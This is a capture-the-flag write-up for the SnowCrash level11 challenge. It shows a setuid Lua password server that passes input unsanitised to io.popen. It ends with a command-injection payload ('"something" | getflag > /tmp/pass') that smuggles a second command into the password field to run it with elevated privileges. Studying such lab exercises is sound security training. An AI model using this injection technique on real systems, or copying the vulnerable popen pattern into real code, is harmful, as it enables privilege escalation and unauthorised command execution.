```bash
level11@SnowCrash:~$ ls -l
total 4
-rwsr-sr-x 1 flag11 level11 668 Mar  5  2016 level11.lua
```

```bash
level11@SnowCrash:~$ file level11.lua 
level11.lua: setuid setgid a lua script, ASCII text executable
```

```lua
level11@SnowCrash:~$ cat level11.lua 
#!/usr/bin/env lua
local socket = require("socket")
local server = assert(socket.bind("127.0.0.1", 5151))

function hash(pass)
  prog = io.popen("echo "..pass.." | sha1sum", "r")
  data = prog:read("*all")
  prog:close()

  data = string.sub(data, 1, 40)

  return data
end


while 1 do
  local client = server:accept()
  client:send("Password: ")
  client:settimeout(60)
  local l, err = client:receive()
  if not err then
      print("trying " .. l)
      local h = hash(l)

      if h ~= "f05d1d066fb246efe0c6f7d095f909a7a0cf34a0" then
          client:send("Erf nope..\n");
      else
          client:send("Gz you dumb*\n")
      end

  end

  client:close()
end
```

```bash
level11@SnowCrash:~$ netstat -tuln | grep :5151
tcp        0      0 127.0.0.1:5151          0.0.0.0:*               LISTEN  
```

```bash
level11@SnowCrash:~$ nc 127.0.0.1 5151 
Password: 
```

So, there is a server listening on port `5151`. Upon sending a request to `127.0.0.1:5151`, a prompt appears asking for a password. The entered password is then used by a function called `hash`, which, in turn, utilizes `popen`. The pass variable holds the password that was provided.

```lua
io.popen("echo "..pass.." | sha1sum", "r")
```

Since the `lua` script has the `SUID` flag set with the privileges of `flag11`, we can exploit the server by setting the value of `password` as `"something" | getflag > /tmp/pass` to execute `getflag`.

```
password : "something" | getflag > /tmp/pass
```
